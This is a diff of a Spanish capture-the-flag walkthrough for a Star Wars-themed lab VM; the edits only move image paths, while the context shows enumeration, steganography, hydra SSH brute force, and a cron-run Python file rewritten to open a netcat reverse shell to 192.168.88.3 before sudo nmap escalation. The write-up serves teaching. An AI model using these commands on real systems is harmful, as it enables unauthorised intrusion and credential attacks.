@@ -93,7 +93,7 @@ Comienzo con el reconocimiento de la máquina vulnerable usando `netdiscover`. C
 netdiscover -r 192.168.88.0/24 -i eth0
 ```
 
-![alt text](/assets/images/starwars1/image-34.png)
+![alt text](/assets/images/posts/starwars1/image-34.png)
 
 Obtengo la IP objetivo de la máquina: `192.168.88.6`
 
@@ -134,19 +134,19 @@ Sistema operativo: Linux 4.X|5.X
 
 Dado que el puerto 80 está abierto, exploro la página web en esta IP objetivo usando un navegador.
 
-![alt text](/assets/images/starwars1/image-35.png)
+![alt text](/assets/images/posts/starwars1/image-35.png)
 
 Reviso el código fuente de la página obteniendolo mediante la herramienta curl.
 
-![alt text](/assets/images/starwars1/image-36.png)
+![alt text](/assets/images/posts/starwars1/image-36.png)
 
 En el código fuente, el autor dejó una pista sobre la contraseña: “la contraseña está aquí”, seguida de un texto que indica una contraseña oculta.
 
-![alt text](/assets/images/starwars1/image-37.png)
+![alt text](/assets/images/posts/starwars1/image-37.png)
 
 Intento  descodificacion suponiendo que esta codificado en base64 al acabar con el simbolo "="
 
-![alt text](/assets/images/starwars1/image-8.png)
+![alt text](/assets/images/posts/starwars1/image-8.png)
 
 Este intento no me lleva a ningun sitio. 
 
@@ -158,13 +158,13 @@ wget http://192.168.88.5:80/images/yoda.png
 wget http://192.168.88.5:80/images/yoda.jpg
 ```
 
-![alt text](/assets/images/starwars1/image-38.png)
+![alt text](/assets/images/posts/starwars1/image-38.png)
 
 Compruebo informacion exif de las imagenes.
 
-![alt text](/assets/images/starwars1/image-39.png)
+![alt text](/assets/images/posts/starwars1/image-39.png)
 
-![alt text](/assets/images/starwars1/image-40.png)
+![alt text](/assets/images/posts/starwars1/image-40.png)
 
 Para comprobar datos ocultos en archivos png y bmp suelo usar la herramienta zsteg que puedes encontrar en el repositorio de github https://github.com/zed-0xff/zsteg
 
@@ -174,11 +174,11 @@ La instalacion se realiza con:
 gem install zsteg
 ```
 
-![alt text](/assets/images/starwars1/image-41.png)
+![alt text](/assets/images/posts/starwars1/image-41.png)
 
 Compruebo la imagen PNG con la herramienta zsteg.
 
-![alt text](/assets/images/starwars1/image-42.png)
+![alt text](/assets/images/posts/starwars1/image-42.png)
 
 Obtengo el siguiente texto oculto: 
 
@@ -188,21 +188,21 @@ the real password is babyYoda123
 
 >Otra forma de llegar a obtener este texto es mediante herramientas de esteganografía online como https://stylesuxx.github.io/steganography/ donde puedes subir la imagen y pulsar sobre Decode Image y obtendras el texto anterior.
 
-![alt text](/assets/images/starwars1/image-16.png)
+![alt text](/assets/images/posts/starwars1/image-16.png)
 
 #### Enumeracion Web
 
 Para la enumeracion web una herramienta muy potente es `gobuster`. La instalo en mi maquina atacante. 
 
-![alt text](/assets/images/starwars1/image-43.png)
+![alt text](/assets/images/posts/starwars1/image-43.png)
 
 Para sacarle buen partido necesito tambien unos diccionarios buenos. Para la enumeracion suelo usar los diccionarios que nos ofrece `seclists`. Se pueden instalar en la maquina directamente con `apt-get install seclist`
 
-![alt text](/assets/images/starwars1/image-44.png)
+![alt text](/assets/images/posts/starwars1/image-44.png)
 
 Una vez instalados estan listos para ser usados.
 
-![alt text](/assets/images/starwars1/image-45.png)
+![alt text](/assets/images/posts/starwars1/image-45.png)
 
 Lanzo gobuster contra la pagina web usando el diccionario de contenido web `directory-list-lowercase-2.3-big.txt`
 
@@ -210,7 +210,7 @@ Lanzo gobuster contra la pagina web usando el diccionario de contenido web `dire
 gobuster dir -u http://192.168.88.6 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .js .txt .html .htm .php
 ```
 
-![alt text](/assets/images/starwars1/image-47.png)
+![alt text](/assets/images/posts/starwars1/image-47.png)
 
 Completo la enumeracion lanzando tambien dirb
 
@@ -218,9 +218,9 @@ Completo la enumeracion lanzando tambien dirb
 dirb http://$IP/ -X ,.php,.html,.js,.txt
 ```
 
-![alt text](/assets/images/starwars1/image-51.png)
+![alt text](/assets/images/posts/starwars1/image-51.png)
 
-![alt text](/assets/images/starwars1/image-52.png)
+![alt text](/assets/images/posts/starwars1/image-52.png)
 
 He encontrado algunos directorios y ficheros que es interesante revisar.
 
@@ -238,7 +238,7 @@ He encontrado algunos directorios y ficheros que es interesante revisar.
 
 - /robots.txt.
 
-![alt text](/assets/images/starwars1/image-53.png)
+![alt text](/assets/images/posts/starwars1/image-53.png)
 
 ```
 Why does the Jedi Order keep checking the robots.txt file.
@@ -250,11 +250,11 @@ En este archivo nos indica que revisemos el archivo `r2d2`.
 
 - /r2d2
 
-![alt text](/assets/images/starwars1/image-54.png)
+![alt text](/assets/images/posts/starwars1/image-54.png)
 
 El archivo r2d2 es un texto. 
 
-![alt text](/assets/images/starwars1/image-55.png)
+![alt text](/assets/images/posts/starwars1/image-55.png)
 
 Guardo el texto para revisarlo con mas detenimiento o por si hace falta mas adelante. 
 
@@ -263,19 +263,19 @@ Guardo el texto para revisarlo con mas detenimiento o por si hace falta mas adel
 
 Al acceder a admin obtengo una web con un login que me indica que intente acceder bajo mi propio riesgo.
 
-![alt text](/assets/images/starwars1/image-58.png)
+![alt text](/assets/images/posts/starwars1/image-58.png)
 
 Al pulsar login me abre un modal donde hacer login
 
-![alt text](/assets/images/starwars1/image-59.png)
+![alt text](/assets/images/posts/starwars1/image-59.png)
 
 - /wordpress
 
-![alt text](/assets/images/starwars1/image-57.png)
+![alt text](/assets/images/posts/starwars1/image-57.png)
 
 - Archivo users.js
 
-![alt text](/assets/images/starwars1/image-56.png)
+![alt text](/assets/images/posts/starwars1/image-56.png)
 
 Obtengo nombres de usuario:
 
@@ -293,7 +293,7 @@ han:babyYoda123
 
 Ambos intentos me llevan a action_page.php pero recibo un "Not Found".
 
-![alt text](/assets/images/starwars1/image-60.png)
+![alt text](/assets/images/posts/starwars1/image-60.png)
 
 Explotacion de servicio SSH
 
@@ -304,7 +304,7 @@ Guardo los usuarios en un fichero de texto llamado `users.txt`
 curl http://192.168.88.6/users.js > users.txt
 cat users.txt
 
-![alt text](/assets/images/starwars1/image-61.png)
+![alt text](/assets/images/posts/starwars1/image-61.png)
 
 Lanzo el ataque con hydra:
 
@@ -312,13 +312,13 @@ Lanzo el ataque con hydra:
 hydra -L users.txt -p babyYoda123 192.168.88.6 ssh
 ```
 
-![alt text](/assets/images/starwars1/image-62.png)
+![alt text](/assets/images/posts/starwars1/image-62.png)
 
 He obtenido que el login es valido para han:babyYoda123
 
 Compruebo el acceso por SSH
 
-![alt text](/assets/images/starwars1/image-63.png)
+![alt text](/assets/images/posts/starwars1/image-63.png)
 
 ### Post-Explotacion
 
@@ -337,9 +337,9 @@ uname -a
 df -h
 ```
 
-![alt text](/assets/images/starwars1/image-67.png)
+![alt text](/assets/images/posts/starwars1/image-67.png)
 
-![alt text](/assets/images/starwars1/image-68.png)
+![alt text](/assets/images/posts/starwars1/image-68.png)
 
 ##### Enumeracion usuarios
 
@@ -348,7 +348,7 @@ Enumero usuarios con los siguientes comandos:
 cat /etc/passwd | grep sh
 lastlog | grep -v "Never"
 
-![alt text](/assets/images/starwars1/image-65.png)
+![alt text](/assets/images/posts/starwars1/image-65.png)
 
 Encuentro que ademas de el usuario `han` existen los usuarios `skywalker` y `Darth` que han hecho login en la maquina.
 
@@ -356,13 +356,13 @@ Encuentro que ademas de el usuario `han` existen los usuarios `skywalker` y `Dar
 
 Compruebo el contenido de la carpeta home del usuario `han`.
 
-![alt text](/assets/images/starwars1/image-69.png)
+![alt text](/assets/images/posts/starwars1/image-69.png)
 
 Hay una carpeta .secrets que es interesante.
 
 Compruebo su contenido y obtengo un fichero note.txt que indica que "Anakin is a cewl kid."
 
-![alt text](/assets/images/starwars1/image-70.png)
+![alt text](/assets/images/posts/starwars1/image-70.png)
 
 Encontrar la palabra cewl me sugiere usar dicha herramienta para generar una lista de palabras.
 
@@ -372,7 +372,7 @@ Uso cewl con el texto que encontre en `http://192.168.88.6/r2d2` para crear un d
 cewl http://192.168.88.6/r2d2 > dict_r2d2.txt
 ```
 
-![alt text](/assets/images/starwars1/image-72.png)
+![alt text](/assets/images/posts/starwars1/image-72.png)
 
 Obtengo un diccionario de 328 palabras.
 
@@ -382,13 +382,13 @@ Lanzo un ataque de fuerza bruta con este diccionario con el usuario skywalker pa
 hydra -l skywalker -P dict.txt 192.168.88.6 ssh
 ```
 
-![alt text](/assets/images/starwars1/image-73.png)
+![alt text](/assets/images/posts/starwars1/image-73.png)
 
 Obtengo una credencial valida para el acceso por SSH `skywalker:tatooine`
 
 Accedo al sistema objetivo con las credenciales obtenidas
 
-![alt text](/assets/images/starwars1/image-74.png)
+![alt text](/assets/images/posts/starwars1/image-74.png)
 
 Realizo una enumeracion de ficheros
 
@@ -397,12 +397,12 @@ ls -lisah
 cd .secrets/
 
 
-![alt text](/assets/images/starwars1/image-76.png)
+![alt text](/assets/images/posts/starwars1/image-76.png)
 
 ls -lisah
 cat note.txt
 
-![alt text](/assets/images/starwars1/image-77.png)
+![alt text](/assets/images/posts/starwars1/image-77.png)
 
 Consigo el texto
 
@@ -414,15 +414,15 @@ Darth must take up the job of being a good father
 
 Anteriormente vi que Darth habia hecho login en el sistema asi que investigo si tiene una carpeta de trabajo.
 
-![alt text](/assets/images/starwars1/image-79.png)
+![alt text](/assets/images/posts/starwars1/image-79.png)
 
 Cambio al directorio de trabajo de Darth y compruebo su contenido.
 
-![alt text](/assets/images/starwars1/image-80.png)
+![alt text](/assets/images/posts/starwars1/image-80.png)
 
 Veo que existe un directorio `.secrets`. Compruebo su contenido y obtengo un fichero llamado `evil.py`.
 
-![alt text](/assets/images/starwars1/image-82.png)
+![alt text](/assets/images/posts/starwars1/image-82.png)
 
 Este fichero parece indicar que "Deja que el miedo fluya a través de ti cada minuto." Es decir que debe ejecutarse algo cada minuto en la maquina, lo que me indica que hay un trabajo en cron cada minuto.
 
@@ -441,45 +441,45 @@ import os
 os.system("nc -e /bin/bash 192.168.88.3 7331")
 ```
 
-![alt text](/assets/images/starwars1/image-84.png)
+![alt text](/assets/images/posts/starwars1/image-84.png)
 
 En una nueva terminal, ejecuto un listener de Netcat para obtener la conexión inversa.
 
 nc -nlvp 7331
 
-![alt text](/assets/images/starwars1/image-85.png)
+![alt text](/assets/images/posts/starwars1/image-85.png)
 
 Tras esperar un minuto obtengo una shell en el sistema con el usuario Darth.
 
-![alt text](/assets/images/starwars1/image-87.png)
+![alt text](/assets/images/posts/starwars1/image-87.png)
 
 Uso un one-liner en Python para obtener una shell TTY mas comoda 
 
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-![alt text](/assets/images/starwars1/image-88.png)
+![alt text](/assets/images/posts/starwars1/image-88.png)
 
 A continuacion compruebo los permisos que Darth tiene sobre binarios del sistema.
 
 sudo -l
 
-![alt text](/assets/images/starwars1/image-89.png)
+![alt text](/assets/images/posts/starwars1/image-89.png)
 
 Indica que Darth puede usar nmap como root sin necesidad de clave.
 
 
 Compruebo en gtfobins si hay escalacion de privilegios por sudo en el comando nmap y veo que es posible.
 
-![alt text](/assets/images/starwars1/image-93.png)
+![alt text](/assets/images/posts/starwars1/image-93.png)
 
 
 Compruebo que version de nmap esta instalada en el sistema objetivo y nos indica que es la version 7.70
 
-![alt text](/assets/images/starwars1/image-91.png)
+![alt text](/assets/images/posts/starwars1/image-91.png)
 
 Ya que la version que existe es superior a la 5.21 pruebo la opcion (a)
 
-![alt text](/assets/images/starwars1/image-92.png)
+![alt text](/assets/images/posts/starwars1/image-92.png)
 
 Y he obtenido el root del sistema.
 
@@ -487,4 +487,4 @@ Busco la flag y la localizo en /root.
 
 Dejo mi firma dentro de la flag.
 
-![alt text](/assets/images/starwars1/image-94.png)
+![alt text](/assets/images/posts/starwars1/image-94.png)
